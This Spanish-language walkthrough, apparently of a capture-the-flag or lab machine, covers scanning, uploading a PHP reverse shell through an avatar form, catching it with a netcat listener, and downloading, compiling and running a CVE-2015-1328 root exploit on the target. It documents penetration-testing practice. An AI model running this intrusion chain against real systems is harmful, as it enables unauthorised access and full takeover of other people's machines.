En primer lugar realizamos un escaneo de puertos con ayuda de la herramienta nmap a la ip víctima.
> nmap -p- -sS -sC -sV --open --min-rate=5000 -vvv -n -Pn IP -oN escaneo
Abrimos el reporte con nano y observamos que el puerto 80 esta abierto. Esto nos indica que nos encontramos ante un servidor web ademas podemos ver la versión de Apache.
![paso1](https://github.com/Destri0/Ciberseguridad/assets/109970051/7536dd12-5e72-4f77-ba16-2cb7eaa6ed95)
Introducimos la ip victima en nuestro buscador y vemos un panel de login.
![Paso2](https://github.com/Destri0/Ciberseguridad/assets/109970051/a5299879-49e6-4661-b822-3e42eb3e46a5)
En este caso al existir un apartado de registro procedemos a nuestro registro en la web.
![Paso3](https://github.com/Destri0/Ciberseguridad/assets/109970051/d16234f4-c21e-46e8-b050-2ed37433cb93)
Una vez registrado buscaremos por toda la pagina un lugar donde se pueda subir un archivo.
![Paso4](https://github.com/Destri0/Ciberseguridad/assets/109970051/7fb0ae53-0fb7-4b44-bdfa-e734372a4e24)
Encontramos en el apartado de Personal options un lugar para subir nuestro avatar. Aprovecharemos eso para subir una reserve shell.
Antes utilizaremos la herramienta gobuster para ver las direcciones que tiene la ip victima donde se podria subir ese archivo.
> gobuster dir -u http://IP_VICTIMA/ -w /usr/share/wordlists/dirbuster/directory-list-lowecase-2.3-medium.txt
![Paso5](https://github.com/Destri0/Ciberseguridad/assets/109970051/00faa6fa-6e38-4742-9b6e-d48fbe463c95)
Una vez ejecutado el comando podremos observar que la ip victima tiene un directorio de subidas. Ahi encontraremos nuestra reserve shell cuando la subamos.
Abrimos el directorio de /uploads en nuestro buscador.
Despues utilizaremos la siguiente reverse shell.
> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
En ese archivo cambiaremos la ip y pondremos la ip desde donde estamos realizando el ataque y el puerto lo cambiaremos por el 433 que sera nuestro puerto de escucha.
Una vez que tenemos el archivo editado lo subiremos al apartado de avatar y observaremos que si nos vamos a /uploads encontraremos el archivo subido.
![Paso6](https://github.com/Destri0/Ciberseguridad/assets/109970051/fba5ac03-3226-4713-b6a0-85afe5d474bf)
Ahora nos pondremos en escucha por el puerto 433 en nuestra consola con el siguiente comando.
> nc -nlvp 433
![Paso7](https://github.com/Destri0/Ciberseguridad/assets/109970051/4fd8dd9f-b57c-4484-a689-3d5dc8f4da13)
Una vez que nos encontramos en escucha por el puerto 433 de nuestra consola nos vamos al directorio de /uploads y pinchamos en nuestro archivo para que se ejecute.
![Paso8](https://github.com/Destri0/Ciberseguridad/assets/109970051/faccc3cb-ca42-4c82-8e54-4f2ababb4608)
Podemos ver en nuestra consola que tenemos acceso a la maquina victima pero no tenemos permisos de root.
En este caso ejecutamos el siguiente comando para ver en que version del sistema operativo nos encontramos.
> lsb_release -a
Vemos que nos encontramos en Ubuntu 14.04 y que es una version muy antigua de Ubuntu. Realizamos unas busquedas en internet sobre vulneravilidades de escalada de privilegios de la version y 14.04 de ubuntu.
Encontramos una vulneravilidad que es la CVE-2015-1328. Ademas encontramos un scrip en github que sera el que utilicemos que es el siguiente.
> https://github.com/DarkenCode/PoC/blob/master/CVE-2015-1328/CVE-2015-1328.c
Dentro de la maquina victima nos colocaremos en el directorio de tmp.
> cd tmp
Despues ejecutaremos el comando siguiente para descargar el archivo en nuesta maquina victima.
> wget https://raw.githubusercontent.com/DarkenCode/PoC/master/CVE-2015-1328/CVE-2015-1328.c
Si ejecutamos el comando ls podemos observar que se a descargado el archivo en nuesta maquina victima.
![Paso9](https://github.com/Destri0/Ciberseguridad/assets/109970051/8972d014-f06b-41c8-ac85-db328b740480)
Tras eso ejecutaremos el siguiente comando para ejecutar el exploit.
> gcc CVE-2015-1328.c -o exploit && ./exploit
Tras eso si ejecutamos el comando
> whoami
![Paso10](https://github.com/Destri0/Ciberseguridad/assets/109970051/8c1b4f7d-2718-406e-92d9-2f7040636281)
Podemos observar que hemos ganado acceso total a la maquina victima como root.
Maquina vulnerada al completo.
